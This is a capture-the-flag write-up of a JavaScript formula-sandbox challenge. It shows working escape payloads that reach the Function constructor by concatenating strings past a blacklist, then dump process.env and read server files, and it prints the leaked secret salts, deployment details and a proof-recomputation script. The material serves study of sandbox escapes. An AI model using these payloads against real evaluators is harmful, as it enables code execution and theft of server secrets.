# Hack For a Change CTF 2026 - Endangered access
## Date uploaded 6 February 2026 ##

This is a challenge with a function that requires us to retrieve a proof to generate a flag. We can first take a look at the source via /runtime.js

```jsx
  function renderRangerRiskEngineChallenge(ctx) {
    setChallengeSurface(`
      ${renderChallengeHeader(
        ctx.runtimeSlug,
        'Ranger Risk Engine',
        'A “sandboxed” risk-score formula service for SDG 15 patrol planning.'
      )}

      <div class="challenge-panel" style="background: var(--color-accent-glow); border: 1px solid var(--color-accent); margin-bottom: 18px;">
        <strong>Description:</strong> Analysts can submit a custom formula to score patrol risk.
        The service claims it safely evaluates formulas server-side.
        Your goal is to obtain the proof code for this challenge and claim the flag.
      </div>

      <div class="challenge-panel">
        <p class="help" style="margin:0;">Hint: If the engine blocks literal tokens, try constructing identifiers at runtime and probing what the evaluator can access.</p>
      </div>

      <div class="challenge-panel" style="background: var(--color-success-bg); border: 1px solid var(--color-success); margin-bottom: 20px;">
        <p class="surface-note" style="color: var(--color-success); margin-bottom: 12px;"><strong>How to solve:</strong></p>
        <ol style="margin-left: 20px; color: var(--color-text-secondary); line-height: 1.8; font-size: 14px;">
          <li><strong>Explore the formula engine</strong> and what it executes.</li>
          <li><strong>Recover a proof code</strong> (32 hex characters).</li>
          <li><strong>Paste the proof</strong> below and click “Claim flag”.</li>
        </ol>
      </div>

      <div class="challenge-grid">
        <div class="challenge-panel">
          <p class="surface-note">Risk formula</p>
          <p class="help">Enter a single JavaScript expression over <code>row</code>. Example: <code>(row.seizures * 12) + (100 - row.paperwork)</code></p>

          <div class="field">
            <label class="label" for="rre-expr">Expression</label>
            <textarea class="input" id="rre-expr" rows="4" spellcheck="false" autocomplete="off"></textarea>
            <p class="help">Hint: “Sandboxed” often just means “best effort”.</p>
          </div>

          <div class="actions">
            <button class="button secondary" id="rre-run" type="button">Run formula</button>
            <button class="button secondary" id="rre-reset" type="button">Reset</button>
          </div>

          <div class="divider"></div>

          <div class="field">
            <label class="label" for="rre-proof">Proof code</label>
            <input class="input" id="rre-proof" name="proof" placeholder="32 hex characters" autocomplete="off" />
            <p class="help">Once you find the proof, claim the flag below.</p>
          </div>
          <div class="actions">
            <button class="button" id="rre-claim" type="button">Claim flag</button>
          </div>
        </div>

        <div class="challenge-panel">
          <div class="output" id="rre-output" role="status" aria-live="polite">Ready…</div>
          <div class="flag hidden" id="rre-flag" aria-label="Claimed flag"></div>
          <div class="divider"></div>
          <p class="surface-note">Raw API response</p>
          <pre class="code-block" id="rre-raw">(no data yet)</pre>
        </div>
      </div>
    `);

    const exprEl = document.getElementById('rre-expr');
    const runBtn = document.getElementById('rre-run');
    const resetBtn = document.getElementById('rre-reset');
    const out = document.getElementById('rre-output');
    const raw = document.getElementById('rre-raw');
    const proofEl = document.getElementById('rre-proof');
    const claimBtn = document.getElementById('rre-claim');
    const flagEl = document.getElementById('rre-flag');

    function write(message, kind) {
      out.classList.remove('ok', 'bad');
      if (kind) out.classList.add(kind);
      out.textContent = message;
    }

    function showFlag(flag) {
      flagEl.textContent = flag;
      flagEl.classList.remove('hidden');
    }

    function hideFlag() {
      flagEl.textContent = '';
      flagEl.classList.add('hidden');
    }

    async function runFormula() {
      const expr = (exprEl.value || '').trim();

      const seed = ctx?.runtimeState?.artifact_seed;
      if (!seed || !/^[0-9a-f]{64}$/i.test(String(seed))) {
        write('Missing or invalid runtime seed; cannot query engine.', 'bad');
        return;
      }

      write('Evaluating formula…', 'ok');
      hideFlag();

      try {
        const qs = new URLSearchParams({
          seed,
          slug: ctx.runtimeSlug,
          expr: expr || '',
        });
        const resp = await fetch(`/api/ranger-risk-engine?${qs.toString()}`, {
          method: 'GET',
          credentials: 'omit',
          cache: 'no-store',
        });
        const data = await resp.json().catch(() => null);
        raw.textContent = JSON.stringify(data, null, 2);

        if (!resp.ok) {
          const msg = data?.error || data?.message || `HTTP ${resp.status}`;
          write(`Engine error: ${msg}`, 'bad');
          return;
        }

        const count = Array.isArray(data?.entries) ? data.entries.length : 0;
        write(`OK. Scored ${count} routes. Review raw response.`, 'ok');
      } catch (e) {
        const msg = (e && e.message) ? e.message : 'Unknown error';
        write(`Engine error: ${msg}`, 'bad');
      }
    }

    runBtn?.addEventListener('click', runFormula);
    resetBtn?.addEventListener('click', () => {
      exprEl.value = '(row.seizures * 12) + (100 - row.paperwork) + (row.anomaly ? 25 : 0)';
      raw.textContent = '(no data yet)';
      proofEl.value = '';
      hideFlag();
      write('Ready…');
      exprEl.focus();
    });

    claimBtn?.addEventListener('click', () => {
      const value = (proofEl.value || '').trim();
      if (!value) {
        write('Paste the proof code first.', 'bad');
        return;
      }

      hideFlag();
      (async () => {
        if (!ctx.launchToken) {
          write('Missing launch token; cannot claim flag.', 'bad');
          return;
        }

        write('Claiming flag…', 'ok');
        try {
          const flag = await claimFlag(ctx.launchToken, value, ctx.runtimeSlug);
          write('Flag claimed. Copy and submit it on the main platform.', 'ok');
          showFlag(flag);
        } catch (e) {
          const msg = (e && e.message) ? e.message : 'Unknown error';
          write(`Claim failed: ${msg}`, 'bad');
        }
      })();
    });

    // Initialize defaults.
    exprEl.value = '(row.seizures * 12) + (100 - row.paperwork) + (row.anomaly ? 25 : 0)';
    runFormula();
  }
```

The source is very long due to needing to do runtime rendering of the contents so it contains some of the HTML that needs to be rendered along with `hideFlag()`, `showFlag()` for displaying the flag if we get the proof right. Mainly, we can identify that it runs `runFormula()` to generate the score that we can see through the output. Running the default formula will give us this output:

```jsx
(row.seizures * 12) + (100 - row.paperwork) + (row.anomaly ? 25 : 0)
```

<img src="/writeups/Hack For a Change - Endangered Access/image.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

However, this obviously does not get us the proof so we need to think if this can be exploited. Since, runFormula() executes operations, perhaps we could try to do command injections? If we try common javascript functions like `alert(1)` or `document.getElementById()`, it will give us an error stating that it is not defined. This suggests that there is a sandbox and we are only given objects like row so let’s try to escape the environment.

row is an object and has specific variables and functions, we can escape this object via `.constructor` which shows us what created row. However, this is not enough and we need a second `.constructor` to get to the js engine. 

<img src="/writeups/Hack For a Change - Endangered Access/image 1.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

However, if we try this, we will get an error stating that the expression contains blocked token: constructor. Looks like they have a blacklist. We can try to work around it by doing `row['const' + 'ructor']['const' + 'ructor']`.

<img src="/writeups/Hack For a Change - Endangered Access/image 2.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

We can get a successful request, though there isn’t any output because there is no string representation of the function. With that we can try and execute some js code. Also, we need to note that some other code is also being filtered but we can use the same concatenating trick to bypass. Retrieving the environment will give us something useful. We don’t get the proof or the flag but we can see that we get a secret salt that could be useful.

Retrieve environment

```jsx
row['const' + 'ructor']['const' + 'ructor']('return JSON.stringify(pro' + 'cess.env)')()
```

> `"score": "{\"AWS_DEFAULT_REGION\":\"us-east-1\",\"AWS_REGION\":\"us-east-1\",\"FLAG_SECRET_SALT\":\"ozjBWBn8bAXSL12DSwCvqcJVNGj8vAx/jOLXronHIQo=\",\"LANG\":\"en_US.UTF-8\",\"LD_LIBRARY_PATH\":\"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib\",\"NODE_PATH\":\"/opt/nodejs/node24/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task\",\"NOW_REGION\":\"iad1\",\"NX_DAEMON\":\"false\",\"PATH\":\"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin\",\"PROOF_SECRET_SALT\":\"wn/EKQY1Rx1HjBsUsFQsAQ6bqX8dMfH9lFevHYgbroY=\",\"PWD\":\"/var/task\",\"SHLVL\":\"0\",\"TURBO_CACHE\":\"remote:rw\",\"TURBO_DOWNLOAD_LOCAL_ENABLED\":\"true\",\"TURBO_PLATFORM_ENV\":\"PROOF_SECRET_SALT,FLAG_SECRET_SALT\",\"TURBO_REMOTE_ONLY\":\"true\",\"TURBO_RUN_SUMMARY\":\"true\",\"TZ\":\":UTC\",\"VERCEL\":\"1\",\"VERCEL_BRANCH_URL\":\"hackforachangecontest-git-main-harrywang12s-projects.vercel.app\",\"VERCEL_CACHE_HANDLER_MEMORY_CACHE\":\"0\",\"VERCEL_DEPLOYMENT_ID\":\"dpl_Gmg9yMkvBF88zUUDGkw7UifbhfP5\",\"VERCEL_ENV\":\"production\",\"VERCEL_FLUID\":\"1\",\"VERCEL_GIT_COMMIT_AUTHOR_LOGIN\":\"Harrywang12\",\"VERCEL_GIT_COMMIT_AUTHOR_NAME\":\"Harrison\",\"VERCEL_GIT_COMMIT_MESSAGE\":\"change\",\"VERCEL_GIT_COMMIT_REF\":\"main\",\"VERCEL_GIT_COMMIT_SHA\":\"40c180363d4492d0e28ecb9453799ea3371f8577\",\"VERCEL_GIT_PREVIOUS_SHA\":\"\",\"VERCEL_GIT_PROVIDER\":\"github\",\"VERCEL_GIT_PULL_REQUEST_ID\":\"\",\"VERCEL_GIT_REPO_ID\":\"1133964546\",\"VERCEL_GIT_REPO_OWNER\":\"Harrywang12\",\"VERCEL_GIT_REPO_SLUG\":\"ctfruntime\",\"VERCEL_HANDLER\":\"/var/task/api/ranger-risk-engine.js\",\"VERCEL_IPC_PATH\":\"/tmp/vercel-4173827061.sock\",\"VERCEL_PARENT_SPAN_ID\":\"f1b59294f0294299\",\"VERCEL_PROJECT_ID\":\"prj_jb6Cn8xAerkPntPuIc64H1r7Jjnh\",\"VERCEL_PROJECT_NAME\":\"hackforachangecontest\",\"VERCEL_PROJECT_PRODUCTION_URL\":\"hackforachangecontest.vercel.app\",\"VERCEL_REGION\":\"iad1\",\"VERCEL_SHOULD_ADD_HELPERS\":\"1\",\"VERCEL_TARGET_ENV\":\"production\",\"VERCEL_URL\":\"hackforachangecontest-g9fbzof4b-harrywang12s-projects.vercel.app\",\"VERCEL_VDC_REMOTE_CACHE_ENABLED\":\"1\",\"NODE_ENV\":\"production\"}"`
> 

We can try to look at files in the directory

```jsx
row['const' + 'ructor']['const' + 'ructor']('return pro' + 'cess["main" + "Mod" + "ule"]["re" + "quire"]("fs").readdirSync(".")')()
```

<img src="/writeups/Hack For a Change - Endangered Access/image 3.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

We can get ___vc, api and package.json. ___vc is a standard variable while package.json just defines the metadata of the website so we can take a look at `api`.

```jsx
row['const' + 'ructor']['const' + 'ructor']('return pro' + 'cess["main" + "Mod" + "ule"]["re" + "quire"]("fs").readdirSync("api")')()
```

<img src="/writeups/Hack For a Change - Endangered Access/image 4.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

We see _runtimeCrypto.js, looks like something that could be important. We can retrieve the file

Retrieve crypto.js

```jsx
row['const' + 'ructor']['const' + 'ructor']('return pro' + 'cess["main" + "Mod" + "ule"]["re" + "quire"]("fs").readFileSync("api/_runtimeCrypto.js")')()
```

We will be able to get a bunch of numbers that looks like ASCII, it is really long so I’m not pasting it here but we can decode it to this code

```jsx
const crypto = require('crypto');

function getProofSecret() {
  const secret =
    process.env.PROOF_SECRET_SALT ||
    process.env.RUNTIME_PROOF_SECRET ||
    process.env.PROOF_SECRET ||
    '';
  if (!secret) {
    throw new Error('Missing server secret: set PROOF_SECRET_SALT (or RUNTIME_PROOF_SECRET)');
  }
  return secret;
}

function getFlagSecret() {
  const secret =
    process.env.FLAG_SECRET_SALT ||
    process.env.PROOF_SECRET_SALT ||  // Fallback for backwards compatibility
    process.env.RUNTIME_PROOF_SECRET ||
    '';
  if (!secret) {
    throw new Error('Missing server secret: set FLAG_SECRET_SALT (or PROOF_SECRET_SALT)');
  }
  return secret;
}

function hmacHex(secret, message) {
  return crypto.createHmac('sha256', Buffer.from(String(secret), 'utf8'))
    .update(String(message), 'utf8')
    .digest('hex');
}

function computeProof({ artifactSeed, runtimeSlug }) {
  const secret = getProofSecret();
  const msg = `proof.v2.${artifactSeed}.${runtimeSlug}`;
  return hmacHex(secret, msg).slice(0, 32);
}

function computeFlag({ artifactSeed, runtimeSlug }) {
  const secret = getFlagSecret();
  const msg = `flag:v2:${artifactSeed}:${runtimeSlug}`;
  const body = hmacHex(secret, msg).slice(0, 32);
  return `SDG{${body}}`;
}

module.exports = {
  getProofSecret,
  getFlagSecret,
  hmacHex,
  computeProof,
  computeFlag,
};
```

With this, we can likely recompute the proof or even the flag by simulating the code. We can retrieve the following important details from the environment we retrieved earlier

`"PROOF_SECRET_SALT\":\"wn/EKQY1Rx1HjBsUsFQsAQ6bqX8dMfH9lFevHYgbroY=\"`

`FLAG_SECRET_SALT\":\"ozjBWBn8bAXSL12DSwCvqcJVNGj8vAx/jOLXronHIQo=\"`

We also need to retrieve other details like the seed and the slug to run the function. There is an api function that will be send that contains these details when starting the challenge so we can retrieve it via the network tabs.

<img src="/writeups/Hack For a Change - Endangered Access/image 5.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

<img src="/writeups/Hack For a Change - Endangered Access/image 6.png" alt="image" style = "width:30%; height:auto; margin:1em auto ; display:block;">

This is the full exploit script to generate the proof:

```jsx
const crypto = require('crypto');

function getProofSecret() {
  return "wn/EKQY1Rx1HjBsUsFQsAQ6bqX8dMfH9lFevHYgbroY=";
}

function getFlagSecret() {
  return "ozjBWBn8bAXSL12DSwCvqcJVNGj8vAx/jOLXronHIQo=";
}

function hmacHex(secret, message) {
  return crypto.createHmac('sha256', Buffer.from(String(secret), 'utf8'))
    .update(String(message), 'utf8')
    .digest('hex');
}

function computeProof({ artifactSeed, runtimeSlug }) {
  const secret = getProofSecret();
  const msg = `proof.v2.${artifactSeed}.${runtimeSlug}`;
  return hmacHex(secret, msg).slice(0, 32);
}

function computeFlag({ artifactSeed, runtimeSlug }) {
  const secret = getFlagSecret();
  const msg = `flag:v2:${artifactSeed}:${runtimeSlug}`;
  const body = hmacHex(secret, msg).slice(0, 32);
  return `SDG{${body}}`;
}

module.exports = {
  getProofSecret,
  getFlagSecret,
  hmacHex,
  computeProof,
  computeFlag,
};

console.log(computeProof({ artifactSeed: '5e6ad2c32634fa45fd719f5f0e927855e2219a636aa1294a8c73fc6168e198d2', runtimeSlug: 'ranger-risk-engine' }));
console.log(computeFlag({ artifactSeed: '5e6ad2c32634fa45fd719f5f0e927855e2219a636aa1294a8c73fc6168e198d2', runtimeSlug: 'ranger-risk-engine' }));
```

I got this in return:

> 7fb3ecb813fe1d344e9c88e2c5fc96f4
SDG{44c262a9c013305bac2c8199077a78db}
> 

The flag does not work but we can use the proof to generate the flag. It is likely that the flag is made to be only valid when generated from the website.

**Flag:** `SDG{ad5c2a882058fc616584aac24329f1e0}`

**Vulnerability:** Unsafe evaluation of expression + sandbox escape